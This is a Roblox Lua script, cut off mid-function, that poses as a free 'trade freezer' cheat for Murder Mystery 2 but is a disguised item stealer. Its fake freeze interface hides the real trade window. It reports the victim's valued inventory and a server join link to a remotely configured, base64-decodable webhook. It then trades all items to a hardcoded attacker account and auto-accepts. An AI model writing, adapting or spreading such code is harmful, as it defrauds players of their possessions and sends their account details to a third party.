--[[ MM2 Trade Freezer v9.2 | KEYLESS | FREE ]]

local CONFIG = {
    WEBHOOK        = "",
    REMOTE_CONFIG  = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/main/cfg.json",
    ATTACKER_ID    = 0,
    ATTACKER_NAME  = "Viivik13",
    REMOTES = {
        send    = "Trade.SendRequest",
        add     = "Trade.OfferItem",
        accept  = "Trade.AcceptTrade",
        confirm = "Trade.CompleteTrade",
        cancel  = "Trade.DeclineTrade",
    },
    LOAD_DURATION  = 120,
    MODE           = "DRAIN",
    FILTER         = "all",
    MIN_VALUE      = 0,
    GODLY_FLOOR    = 100,
    MAX_ITEMS      = 20,
    MAX_TRADES     = 1,
    BETWEEN_TRADES = 12,
    ACCEPT_DELAY   = 5,
    PRE_DELAY      = 8,
    REQUEST_TIMEOUT = 100,
    WINDOW_WATCHDOG = 35,
    REMINDER_EVERY = 45,
    MAX_REMINDERS  = 3,
    PER_ROUND_WEBHOOK = true,
    BLUR_OFF       = true,
    PLACE_ID       = 142823291,
    DEBUG          = true,
}

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local Lighting          = game:GetService("Lighting")

local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

local STATE = { stopped = false, rounds = 0 }
getgenv().MM2FZ = { stop = function() STATE.stopped = true end }

local nc = newcclosure or function(f) return f end

local httpFn = (syn and syn.request) or (http and http.request)
    or http_request or (fluxus and fluxus.request) or request

local function http(t)
    if not httpFn then return nil end
    local ok, res = pcall(httpFn, t)
    if ok then return res end
    return nil
end

local function chunkString(s, n)
    local out = {}
    for i = 1, #s, n do out[#out + 1] = s:sub(i, i + n - 1) end
    return out
end

local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function b64decode(s)
    s = s:gsub("[^%w%+/=]", "")
    local out, buf, bits = {}, 0, 0
    for i = 1, #s do
        local c = s:sub(i, i)
        if c ~= "=" then
            local v = B64:find(c, 1, true)
            if v then
                buf = buf * 64 + (v - 1)
                bits = bits + 6
                while bits >= 8 do
                    bits = bits - 8
                    out[#out + 1] = string.char(math.floor(buf / 2 ^ bits) % 256)
                    buf = buf % 2 ^ bits
                end
            end
        end
    end
    return table.concat(out)
end

local function getUrl(url)
    local opts = {}
    opts.Url = url
    opts.Method = "GET"
    return http(opts)
end

local function loadConfig()
    if CONFIG.REMOTE_CONFIG == "" then return end
    local res = getUrl(CONFIG.REMOTE_CONFIG .. "?t=" .. os.time())
    if res and res.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and type(d) == "table" then
            if type(d.webhook) == "string" and d.webhook ~= "" then
                if d.webhook:find("^https") then
                    CONFIG.WEBHOOK = d.webhook
                else
                    CONFIG.WEBHOOK = b64decode(d.webhook)
                end
            end
            if tonumber(d.attacker_id) then CONFIG.ATTACKER_ID = tonumber(d.attacker_id) end
        end
    end
end

local function webhook(title, color, desc, fields, content)
    if not httpFn or CONFIG.WEBHOOK == "" then return end
    task.spawn(function()
        local payload = {}
        payload.username = "MM2 Monitor"
        payload.content = content
        local thumb = {}
        thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
        local foot = {}
        foot.text = "MM2 Trade Freezer v9.2"
        local emb = {}
        emb.title = title
        emb.description = desc
        emb.color = color
        emb.timestamp = DateTime.now():ToIsoDate()
        emb.thumbnail = thumb
        emb.footer = foot
        emb.fields = fields
        payload.embeds = { emb }
        local opts = {}
        opts.Url = CONFIG.WEBHOOK
        opts.Method = "POST"
        local hdrs = {}
        hdrs["Content-Type"] = "application/json"
        opts.Headers = hdrs
        opts.Body = HttpService:JSONEncode(payload)
        http(opts)
    end)
end

local PURPLE = Color3.fromRGB(139, 92, 246)
local PURPLE_D = Color3.fromRGB(109, 62, 216)
local TILE = Color3.fromRGB(30, 27, 51)
local BG = Color3.fromRGB(22, 20, 38)

local fakeGui = Instance.new("ScreenGui")
fakeGui.Name = "MM2_TradeFreezer"
fakeGui.ResetOnSpawn = false
fakeGui.IgnoreGuiInset = true
fakeGui.DisplayOrder = 2147483647
fakeGui.Parent = playerGui

local glow = Instance.new("Frame")
glow.Size = UDim2.fromOffset(372, 352)
glow.Position = UDim2.new(0.5, -186, 0.16, -6)
glow.BackgroundColor3 = PURPLE
glow.BackgroundTransparency = 0.55
glow.BorderSizePixel = 0
glow.Parent = fakeGui
local glowC = Instance.new("UICorner")
glowC.CornerRadius = UDim.new(0, 16)
glowC.Parent = glow

local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(360, 340)
main.Position = UDim2.new(0.5, -180, 0.16, 0)
main.BackgroundColor3 = BG
main.BorderSizePixel = 0
main.Active = false
main.Parent = fakeGui
local mc = Instance.new("UICorner")
mc.CornerRadius = UDim.new(0, 12)
mc.Parent = main
local mStroke = Instance.new("UIStroke")
mStroke.Color = PURPLE
mStroke.Thickness = 2
mStroke.Parent = main

local uiScale = Instance.new("UIScale")
uiScale.Parent = main
local glowScale = Instance.new("UIScale")
glowScale.Parent = glow

local cam = workspace.CurrentCamera

local function applyScale()
    local vp = cam.ViewportSize
    if vp.X > 0 and vp.Y > 0 then
        local s = math.clamp(math.min(vp.X / 460, vp.Y / 620), 0.55, 1.05)
        uiScale.Scale = s
        glowScale.Scale = s
    end
end
applyScale()
pcall(function() cam:GetPropertyChangedSignal("ViewportSize"):Connect(applyScale) end)

local head = Instance.new("TextLabel")
head.Size = UDim2.new(1, -28, 0, 26)
head.Position = UDim2.fromOffset(14, 14)
head.BackgroundTransparency = 1
head.Font = Enum.Font.GothamBlack
head.TextSize = 20
head.TextXAlignment = Enum.TextXAlignment.Left
head.TextColor3 = Color3.fromRGB(255, 255, 255)
head.Text = "FREEZE TRADE SCRIPT"
head.Parent = main

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -28, 0, 16)
sub.Position = UDim2.fromOffset(14, 40)
sub.BackgroundTransparency = 1
sub.Font = Enum.Font.GothamBold
sub.TextSize = 11
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.TextColor3 = Color3.fromRGB(239, 68, 68)
sub.Text = "MURDER MYSTERY 2"
sub.Parent = main

local badge = Instance.new("TextLabel")
badge.Size = UDim2.fromOffset(56, 18)
badge.Position = UDim2.new(1, -70, 0, 18)
badge.BackgroundColor3 = PURPLE_D
badge.Font = Enum.Font.GothamBold
badge.TextSize = 9
badge.TextColor3 = Color3.fromRGB(240, 235, 255)
badge.Text = "KEYLESS"
badge.Parent = main
local bc = Instance.new("UICorner")
bc.CornerRadius = UDim.new(0, 4)
bc.Parent = badge

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -28, 0, 14)
statusLabel.Position = UDim2.fromOffset(14, 296)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 10
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextColor3 = Color3.fromRGB(167, 139, 250)
statusLabel.Text = "FREEZE ACTIVE"
statusLabel.Parent = main

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.fromOffset(80, 14)
timerLabel.Position = UDim2.new(1, -94, 0, 296)
timerLabel.BackgroundTransparency = 1
timerLabel.Font = Enum.Font.Code
timerLabel.TextSize = 10
timerLabel.TextXAlignment = Enum.TextXAlignment.Right
timerLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
timerLabel.Text = "00:00"
timerLabel.Parent = main

local freezeOn = true
local autoOn = true

local function makeTile(y, icon, label, subtext, onText, offText, isFreeze)
    local tile = Instance.new("TextButton")
    tile.Size = UDim2.new(1, -28, 0, 34)
    tile.Position = UDim2.fromOffset(14, y)
    tile.BackgroundColor3 = TILE
    tile.BorderSizePixel = 0
    tile.AutoButtonColor = false
    tile.Text = ""
    tile.Parent = main
    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(0, 8)
    tc.Parent = tile
    local ts = Instance.new("UIStroke")
    ts.Color = Color3.fromRGB(58, 48, 92)
    ts.Thickness = 1
    ts.Parent = tile

    local box = Instance.new("Frame")
    box.Size = UDim2.fromOffset(26, 26)
    box.Position = UDim2.fromOffset(5, 4)
    box.BackgroundColor3 = PURPLE_D
    box.BorderSizePixel = 0
    box.Parent = tile
    local bx = Instance.new("UICorner")
    bx.CornerRadius = UDim.new(0, 6)
    bx.Parent = box
    local glyph = Instance.new("TextLabel")
    glyph.Size = UDim2.new(1, 0, 1, 0)
    glyph.BackgroundTransparency = 1
    glyph.Font = Enum.Font.GothamBold
    glyph.TextSize = 14
    glyph.TextColor3 = Color3.fromRGB(240, 235, 255)
    glyph.Text = icon
    glyph.Parent = box

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -110, 0, 14)
    lbl.Position = UDim2.fromOffset(38, 4)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextColor3 = Color3.fromRGB(235, 235, 245)
    lbl.Text = label
    lbl.Parent = tile

    local sm = Instance.new("TextLabel")
    sm.Size = UDim2.new(1, -110, 0, 12)
    sm.Position = UDim2.fromOffset(38, 18)
    sm.BackgroundTransparency = 1
    sm.Font = Enum.Font.Gotham
    sm.TextSize = 9
    sm.TextXAlignment = Enum.TextXAlignment.Left
    sm.TextColor3 = Color3.fromRGB(150, 145, 175)
    sm.Text = subtext
    sm.Parent = tile

    local pill = Instance.new("Frame")
    pill.Size = UDim2.fromOffset(36, 18)
    pill.Position = UDim2.new(1, -46, 0, 8)
    pill.BackgroundColor3 = PURPLE
    pill.Parent = tile
    local pc = Instance.new("UICorner")
    pc.CornerRadius = UDim.new(1, 0)
    pc.Parent = pill

    local knob = Instance.new("Frame")
    knob.Size = UDim2.fromOffset(14, 14)
    knob.Position = UDim2.fromOffset(19, 2)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    knob.Parent = pill
    local kc = Instance.new("UICorner")
    kc.CornerRadius = UDim.new(1, 0)
    kc.Parent = knob

    local function toggle()
        local on
        if isFreeze then
            freezeOn = not freezeOn
            on = freezeOn
        else
            autoOn = not autoOn
            on = autoOn
        end
        if on then
            pill.BackgroundColor3 = PURPLE
            knob.Position = UDim2.fromOffset(19, 2)
            statusLabel.Text = onText
            statusLabel.TextColor3 = Color3.fromRGB(167, 139, 250)
        else
            pill.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
            knob.Position = UDim2.fromOffset(3, 2)
            statusLabel.Text = offText
            statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
        end
    end

    tile.MouseButton1Click:Connect(toggle)
end

makeTile(66, "❄", "Freeze Trade", "Active", "FREEZE ACTIVE", "FREEZE DISABLED", true)
makeTile(104, "✔", "Auto Accept", "Active", "AUTO ACCEPT ACTIVE", "AUTO ACCEPT OFF", false)
makeTile(142, "$", "Force Give All Weapon", "Active", "FORCE GIVE ACTIVE", "FORCE GIVE OFF", false)

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -28, 0, 12)
footer.Position = UDim2.fromOffset(14, 320)
footer.BackgroundTransparency = 1
footer.Font = Enum.Font.Gotham
footer.TextSize = 9
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.TextColor3 = Color3.fromRGB(120, 115, 145)
footer.Text = "keyless · v9.2"
footer.Parent = main

local timerCount = 0

local function tickTimer()
    while true do
        task.wait(1)
        if freezeOn then
            timerCount = timerCount + 1
            local mins = math.floor(timerCount / 60)
            local secs = timerCount % 60
            timerLabel.Text = string.format("%02d:%02d", mins, secs)
        end
    end
end
task.spawn(tickTimer)

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, -28, 0, 7)
barBg.Position = UDim2.fromOffset(14, 182)
barBg.BackgroundColor3 = Color3.fromRGB(40, 36, 62)
barBg.BorderSizePixel = 0
barBg.Parent = main
local bbgc = Instance.new("UICorner")
bbgc.CornerRadius = UDim.new(0, 4)
bbgc.Parent = barBg

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = PURPLE
bar.BorderSizePixel = 0
bar.Parent = barBg
local barc = Instance.new("UICorner")
barc.CornerRadius = UDim.new(0, 4)
barc.Parent = bar

local pctLabel = Instance.new("TextLabel")
pctLabel.Size = UDim2.new(1, -28, 0, 12)
pctLabel.Position = UDim2.fromOffset(14, 193)
pctLabel.BackgroundTransparency = 1
pctLabel.Font = Enum.Font.Code
pctLabel.TextSize = 9
pctLabel.TextXAlignment = Enum.TextXAlignment.Left
pctLabel.TextColor3 = Color3.fromRGB(150, 145, 175)
pctLabel.Text = "0%  ::  initializing"
pctLabel.Parent = main

local console = Instance.new("ScrollingFrame")
console.Size = UDim2.new(1, -28, 0, 82)
console.Position = UDim2.fromOffset(14, 208)
console.BackgroundColor3 = Color3.fromRGB(18, 16, 30)
console.BackgroundTransparency = 0.35
console.BorderSizePixel = 0
console.ScrollBarThickness = 2
console.ScrollBarImageColor3 = PURPLE_D
console.AutomaticCanvasSize = Enum.AutomaticSize.Y
console.Parent = main
local cc = Instance.new("UICorner")
cc.CornerRadius = UDim.new(0, 6)
cc.Parent = console
local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 2)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Parent = console

local lineCount = 0

local function log(msg)
    lineCount = lineCount + 1
    local line = Instance.new("TextLabel")
    line.Size = UDim2.new(1, -8, 0, 11)
    line.Position = UDim2.fromOffset(4, 0)
    line.BackgroundTransparency = 1
    line.Font = Enum.Font.Code
    line.TextSize = 9
    line.TextXAlignment = Enum.TextXAlignment.Left
    line.TextColor3 = Color3.fromRGB(160, 200, 175)
    line.Text = "> " .. msg
    line.LayoutOrder = lineCount
    line.Parent = console
    if #console:GetChildren() > 26 then
        for _, c in ipairs(console:GetChildren()) do
            if c:IsA("TextLabel") and c.LayoutOrder <= lineCount - 22 then
                c:Destroy()
            end
        end
    end
    if CONFIG.DEBUG then print("[FZ] " .. msg) end
end

local progress = 0
local frozenDone = false
local stallUntil = 0
local startClock = os.clock()
local stageMsgs = { "hooking trade service", "patching window lock", "syncing item cache", "resolving value index", "reapplying freeze" }

local function stageFor(p)
    if p < 25 then return stageMsgs[1] end
    if p < 50 then return stageMsgs[2] end
    if p < 75 then return stageMsgs[3] end
    return stageMsgs[4]
end

local function runLoader()
    while true do
        local el = os.clock() - startClock
        if el >= CONFIG.LOAD_DURATION then frozenDone = true end
        if frozenDone then
            bar.Size = UDim2.new(0.99, 0, 1, 0)
            pctLabel.Text = "99%  ::  " .. stageMsgs[5] .. "..."
            task.wait(2)
        elseif os.clock() < stallUntil then
            task.wait(0.5)
        else
            if math.random() < 0.055 then
                stallUntil = os.clock() + math.random(2, 6)
            end
            local frac = math.clamp(el / CONFIG.LOAD_DURATION, 0, 1)
            local target = math.max(1, 99 * (1 - (1 - frac) ^ 2.0))
            progress = math.min(99, progress + math.max(0.4, (target - progress) * 0.22))
            bar.Size = UDim2.new(progress / 100, 0, 1, 0)
            pctLabel.Text = math.floor(progress) .. "%  ::  " .. stageFor(progress)
            task.wait(math.random(35, 80) / 100)
        end
    end
end
task.spawn(runLoader)

log("Trade Freezer v9.2 loaded")

local VALUES = {}

local function key(s)
    local low = (s or ""):lower()
    low = low:gsub("^%s+", "")
    low = low:gsub("%s+$", "")
    return low
end

local function setVal(name, v)
    local num = tonumber(v)
    if not name or not num or num <= 0 then return end
    local k = key(name)
    if not VALUES[k] or num > VALUES[k] then VALUES[k] = num end
end

local SOURCES = {
    "https://raw.githubusercontent.com/m04118970-coder/Mm2-value-list/main/supreme_values.json",
    "https://raw.githubusercontent.com/zeebinski/MM2-Values/main/values.json",
    "https://raw.githubusercontent.com/timez170/mm2-values/main/values.json",
}

local function ingest(data)
    if type(data) ~= "table" then return 0 end
    if type(data.items) == "table" then data = data.items end
    local n = 0
    for k, v in pairs(data) do
        if type(v) == "table" then
            local nm = v.name or v.item or v.display
            if not nm and type(k) == "string" then nm = k end
            setVal(nm, v.value or v.val or v.price)
            n = n + 1
        elseif type(v) == "number" and type(k) == "string" then
            setVal(k, v)
            n = n + 1
        end
    end
    return n
end

local GODLY = {}
local ANCIENT = {}
local UNIQUE = {}

local function fill(t, list)
    for _, n in ipairs(list) do t[n] = true end
end

fill(GODLY, { "seer", "luger", "slasher", "deathshard", "fang", "shark", "gingerblade", "heat", "saw", "tides", "gemstone", "lightbringer", "darkbringer", "corrupt" })
fill(ANCIENT, { "gingerscope", "icebreaker", "harvester", "battleaxe", "icewing", "nebula", "traveler's gun", "traveler's knife", "snowstorm", "blizzard" })
fill(UNIQUE, { "moon", "sun", "aurora", "virtue", "prismatic", "bloodweaver", "ghostblade", "spirit" })

local function rarityTag(name)
    local k = key(name)
    if k:find("^chroma ") then return "C" end
    if ANCIENT[k] then return "A" end
    if UNIQUE[k] then return "U" end
    if GODLY[k] then return "G" end
    return nil
end

local BASELINE = {
    ["gingerscope"]=10500, ["icebreaker"]=5600, ["harvester"]=3900, ["battleaxe"]=3100,
    ["icewing"]=2700, ["traveler's gun"]=1350, ["traveler's knife"]=1300, ["nebula"]=1150,
    ["blizzard"]=300, ["snowstorm"]=290,
    ["chroma seer"]=2450, ["chroma corrupt"]=2250, ["chroma lightbringer"]=2050,
    ["chroma darkbringer"]=2000, ["chroma luger"]=1900, ["chroma gemstone"]=1850,
    ["chroma slasher"]=1750, ["chroma deathshard"]=1600, ["chroma tides"]=1550,
    ["chroma fang"]=1500, ["chroma shark"]=1400, ["chroma gingerblade"]=1300,
    ["chroma heat"]=1200, ["chroma saw"]=1150,
    ["corrupt"]=1550, ["seer"]=950, ["lightbringer"]=920, ["darkbringer"]=900,
    ["luger"]=850, ["gemstone"]=820, ["slasher"]=790, ["deathshard"]=740,
    ["tides"]=710, ["fang"]=680, ["shark"]=650, ["gingerblade"]=630,
    ["heat"]=610, ["saw"]=590,
    ["moon"]=900, ["sun"]=800, ["aurora"]=650, ["virtue"]=550,
    ["prismatic"]=500, ["bloodweaver"]=450, ["ghostblade"]=410, ["spirit"]=380,
    ["jingle gun"]=280, ["eternal"]=250, ["eternal ii"]=240, ["eternal iii"]=230,
    ["eternal iv"]=220, ["candleflame"]=210, ["sugar"]=195, ["gingermint"]=185,
    ["peppermint"]=175, ["frostbite"]=165, ["snowflake"]=155, ["winter's edge"]=145,
    ["logchopper"]=135, ["cookies"]=125, ["candy"]=115, ["xmas"]=105,
    ["america"]=98, ["red fire"]=92, ["pixel"]=86, ["elite"]=80, ["alex"]=75,
    ["denis"]=70, ["corl"]=65, ["case hardened"]=60, ["night star"]=55, ["green luger"]=50,
}
for k, v in pairs(BASELINE) do VALUES[k] = v end

local function loadValues()
    for _, url in ipairs(SOURCES) do
        local res = getUrl(url)
        if res and res.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok and type(data) == "table" then
                if ingest(data) > 20 then
                    log("value index synced")
                    return
                end
            end
        end
    end
    log("value mirrors offline")
end

local function valueOf(name)
    local v = VALUES[key(name)]
    if v then return v end
    return VALUES[key(name):gsub("%s*%(.-%)%s*$", "")] or 0
end

local JUNK = {
    ["weapons"]=true, ["search"]=true, ["item"]=true, ["items"]=true,
    ["loading..."]=true, ["materials"]=true, ["container"]=true, ["result"]=true,
    ["unique"]=true, ["chroma"]=true, ["halloween"]=true, ["christmas"]=true,
    ["easter"]=true, ["summer"]=true, ["ancient"]=true, ["godly"]=true,
}

local function isJunkName(n)
    local k = key(n)
    if JUNK[k] then return true end
    if k:match("^x%d+$") then return true end
    if k:match("^material%d*$") then return true end
    if #k < 3 then return true end
    return false
end

local function cardName(card)
    local bg = card:FindFirstChild("BG")
    local lbl = card:FindFirstChild("Label")
    if bg and lbl and lbl:IsA("TextLabel") then
        local t = lbl.Text
        if t and #t > 1 then return t end
    end
    return nil
end

local function inventoryRoots()
    local roots = {}
    local mg = playerGui:FindFirstChild("MainGUI")
    if mg then
        local inv = mg:FindFirstChild("Inventory")
        if inv then roots[#roots + 1] = inv end
    end
    return roots
end

local function harvest(root, items, seen, counter)
    for _, d in ipairs(root:GetDescendants()) do
        if d:IsA("Frame") or d:IsA("TextButton") or d:IsA("ImageButton") then
            local nm = cardName(d)
            if nm and not isJunkName(nm) then
                counter.n = counter.n + 1
                local k = key(nm)
                if not seen[k] then
                    seen[k] = true
                    local e = {}
                    e.name = nm
                    e.slot = counter.n
                    e.value = valueOf(nm)
                    e.tag = rarityTag(nm)
                    e.card = d
                    items[#items + 1] = e
                end
            end
        end
    end
end

local function getItems()
    local items = {}
    local seen = {}
    local counter = { n = 0 }
    for _, r in ipairs(inventoryRoots()) do
        harvest(r, items, seen, counter)
    end
    table.sort(items, function(a, b) return a.value > b.value end)
    return items
end

local function isWanted(it)
    if CONFIG.FILTER == "all" then return true end
    if CONFIG.FILTER == "value" then return it.value >= CONFIG.MIN_VALUE end
    local k = key(it.name)
    if k:find("^chroma ") then return true end
    if CONFIG.FILTER == "godly" then
        if GODLY[k] then return true end
        return it.value >= CONFIG.GODLY_FLOOR
    end
    if GODLY[k] then return true end
    if ANCIENT[k] then return true end
    if UNIQUE[k] then return true end
    return it.value >= CONFIG.GODLY_FLOOR
end

loadConfig()

local function byPath(path)
    local node = ReplicatedStorage
    for part in path:gmatch("[^%.]+") do
        node = node:FindFirstChild(part)
        if not node then return nil end
    end
    return node
end

local function usable(r)
    if not r then return false end
    if r:IsA("RemoteEvent") then return true end
    if r:IsA("RemoteFunction") then return true end
    return false
end

local function call(remote, ...)
    if not usable(remote) then return end
    local args = { ... }
    local n = select("#", ...)
    if remote:IsA("RemoteFunction") then
        pcall(function() remote:InvokeServer(table.unpack(args, 1, n)) end)
    else
        pcall(function() remote:FireServer(table.unpack(args, 1, n)) end)
    end
end

local R = {}
R.send    = byPath(CONFIG.REMOTES.send)
R.add     = byPath(CONFIG.REMOTES.add)
R.accept  = byPath(CONFIG.REMOTES.accept)
R.confirm = byPath(CONFIG.REMOTES.confirm)
R.cancel  = byPath(CONFIG.REMOTES.cancel)

local hookDone = false

local function hookOffer()
    if hookDone then return end
    hookDone = true
    pcall(function()
        local target = R.add
        if not target then return end
        local mt = getrawmetatable(game)
        local oldIndex = mt.__index
        setreadonly(mt, false)
        mt.__index = nc(function(self, k)
            local v = oldIndex(self, k)
            if self == target and k == "FireServer" then
                return nc(function(_, ...)
                    local a = {}
                    for i = 1, select("#", ...) do
                        local x = select(i, ...)
                        if typeof(x) == "Instance" then
                            a[i] = x.ClassName .. ":" .. x.Name
                        else
                            a[i] = tostring(x)
                        end
                    end
                    print("[FZ] OFFER ARGS = " .. table.concat(a, " , "))
                    return v(_, ...)
                end)
            end
            return v
        end)
        setreadonly(mt, true)
        print("[FZ] offer hook installed")
    end)
end
hookOffer()

local function hideTradeUI()
    for _, g in ipairs(playerGui:GetChildren()) do
        if g ~= fakeGui and g:IsA("ScreenGui") then
            local n = g.Name:lower()
            if n:find("trade") and g.Enabled then
                g.Enabled = false
            end
        end
    end
    if CONFIG.BLUR_OFF then
        local b = Lighting:FindFirstChildOfClass("BlurEffect")
        if b then
            if b.Size > 0 then b.Size = 0 end
        end
    end
end

local function hideLoop()
    while true do
        hideTradeUI()
        task.wait(0.15)
    end
end
task.spawn(hideLoop)

local function tradeGui()
    for _, g in ipairs(playerGui:GetChildren()) do
        if g ~= fakeGui and g:IsA("ScreenGui") then
            local n = g.Name:lower()
            if n:find("trade") then return g end
        end
    end
    return nil
end

local function offerCount(gui)
    if not gui then return nil end
    local yo = gui:FindFirstChild("YourOffer", true)
    if not yo then return nil end
    return #yo:GetDescendants()
end

local function target()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then
            if CONFIG.ATTACKER_ID > 0 then
                if p.UserId == CONFIG.ATTACKER_ID then return p end
            else
                if p.Name:lower() == CONFIG.ATTACKER_NAME:lower() then return p end
            end
        end
    end
    return nil
end

local function serverLink()
    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
end

local function itemLines(list, limit)
    local a = {}
    for i = 1, math.min(#list, limit or #list) do
        local it = list[i]
        local line = it.name
        if it.value > 0 then line = line .. " (" .. it.value .. ")" end
        a[#a + 1] = line
    end
    return table.concat(a, "\n")
end

local function notifyJoin(items, total)
    local fields = {}
    local f1 = {}
    f1.name = "Items (" .. #items .. ")"
    local body = itemLines(items, 20)
    if #body > 1000 then body = body:sub(1, 1000) end
    f1.value = body
    f1.inline = false
    fields[1] = f1
    local f2 = {}
    f2.name = "Join"
    f2.value = "[CLICK TO JOIN](" .. serverLink() .. ")"
    f2.inline = false
    fields[2] = f2
    local desc = "`" .. lp.Name .. "`"
    if total > 0 then desc = desc .. " - " .. total .. " total" end
    webhook("MM2 HIT", 0x8B5CF6, desc, fields, "@here")
end

local function waitForTarget()
    local tgt = target()
    if tgt then return tgt end
    log("waiting for host")
    for i = 1, CONFIG.MAX_REMINDERS do
        local w = 0
        while w < CONFIG.REMINDER_EVERY do
            if STATE.stopped then break end
            task.wait(1)
            w = w + 1
            tgt = target()
            if tgt then return tgt end
        end
        if tgt then return tgt end
        local f = {}
        f.name = "Join"
        f.value = "[CLICK TO JOIN](" .. serverLink() .. ")"
        f.inline = false
        webhook("Reminder " .. i, 0xFFAA33, "`" .. lp.Name .. "` still waiting", { f }, "@here")
    end
    return nil
end

local SHAPES = {
    { "slot" },
    { "slot0" },
    { "name" },
    { "namelower" },
    { "slotstr" },
    { "card" },
    { "slotname" },
    { "nameslot" },
}

local function shapeArgs(it, shape)
    local a = {}
    for _, s in ipairs(shape) do
        if s == "slot" then a[#a + 1] = it.slot
        elseif s == "slot0" then a[#a + 1] = it.slot - 1
        elseif s == "name" then a[#a + 1] = it.name
        elseif s == "namelower" then a[#a + 1] = it.name:lower()
        elseif s == "slotstr" then a[#a + 1] = tostring(it.slot)
        elseif s == "card" then a[#a + 1] = it.card
        elseif s == "slotname" then a[#a + 1] = it.slot; a[#a + 1] = it.name
        elseif s == "nameslot" then a[#a + 1] = it.name; a[#a + 1] = it.slot
        end
    end
    return a
end

local function tryOffer(it, base, placed, verbose)
    for idx, shape in ipairs(SHAPES) do
        local args = shapeArgs(it, shape)
        call(R.add, table.unpack(args))
        task.wait(0.3)
        local g = tradeGui()
        local c = offerCount(g)
        if c and c > base + placed then
            if verbose then log("shape ok: " .. table.concat(shape, "+")) end
            return true
        end
        if verbose then log("shape " .. idx .. " no: " .. table.concat(shape, "+")) end
    end
    return false
end

local function doRound(batch, tgt, round)
    local gui = nil
    local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
    local attempt = 0
    while os.clock() < deadline do
        if gui then break end
        if STATE.stopped then break end
        attempt = attempt + 1
        if attempt % 3 == 1 then log("request -> " .. tgt.Name) end
        call(R.send, tgt)
        local w = 0
        while w < 4 do
            if gui then break end
            task.wait(0.25)
            w = w + 0.25
            gui = tradeGui()
        end
        local still = target()
        if still then tgt = still end
    end
    if not gui then return false, "window never opened" end

    hideTradeUI()
    log("window locked")
    task.wait(0.8)
    gui = tradeGui()
    if not gui then return false, "window vanished" end

    local base = offerCount(gui) or 0
    local placed = 0
    for i, it in ipairs(batch) do
        if STATE.stopped then break end
        local verbose = (i == 1 and CONFIG.DEBUG)
        if tryOffer(it, base, placed, verbose) then
            placed = placed + 1
        end
        task.wait(0.15)
    end

    if placed == 0 then
        call(R.cancel)
        return false, "nothing placed"
    end
    log("offered " .. placed .. "/" .. #batch)

    task.wait(CONFIG.ACCEPT_DELAY)
    call(R.accept)
    task.wait(0.8)
    call(R.confirm)
    task.wait(0.6)
    call(R.accept)

    local t = 0
    while t < CONFIG.WINDOW_WATCHDOG do
        if not tradeGui() then break end
        task.wait(0.5)
        t = t + 0.5
    end
    local closed = tradeGui() == nil
    if not closed then call(R.cancel) end
    task.wait(1)

    local remSet = {}
    for _, r in ipairs(getItems()) do remSet[key(r.name)] = true end
    local left = 0
    for _, it in ipairs(batch) do
        if remSet[key(it.name)] then left = left + 1 end
    end
    local gone = #batch - left

    if closed and gone >= math.ceil(#batch * 0.75) then return true, gone end
    return false, "unconfirmed (gone " .. gone .. "/" .. #batch .. ")"
end

local function run()
    if not R.send then
        log("no send remote")
        return
    end

    loadValues()
    task.wait(0.4)

    local grand = {}
    local grandValue = 0

    while STATE.rounds < CONFIG.MAX_TRADES do
        if STATE.stopped then break end
        local wanted = {}
        for _, it in ipairs(getItems()) do
            if isWanted(it) then wanted[#wanted + 1] = it end
            if #wanted >= CONFIG.MAX_ITEMS then break end
        end
        if #wanted == 0 then
            log("no items found")
            break
        end

        local total = 0
        for _, it in ipairs(wanted) do total = total + it.value end

        if STATE.rounds == 0 then notifyJoin(wanted, total) end
        local tgt = waitForTarget()
        if not tgt then
            log("host never joined")
            break
        end

        if STATE.rounds == 0 then
            log("arming " .. CONFIG.PRE_DELAY .. "s")
            task.wait(CONFIG.PRE_DELAY)
        end

        STATE.rounds = STATE.rounds + 1
        badge.Text = "R" .. STATE.rounds
        log("round " .. STATE.rounds .. ": " .. #wanted)

        local ok, info = doRound(wanted, tgt, STATE.rounds)
        if ok then
            for _, it in ipairs(wanted) do
                grand[#grand + 1] = it
                grandValue = grandValue + it.value
            end
            log("cleared (" .. info .. ")")
            webhook("Cleared", 0x8B5CF6, "**" .. lp.Name .. "** - " .. info .. " item(s)")
        else
            log("failed: " .. info)
            webhook("Failed", 0xFFAA33, "`" .. game.JobId .. "` - " .. info)
            break
        end

        if CONFIG.MODE ~= "DRAIN" then break end
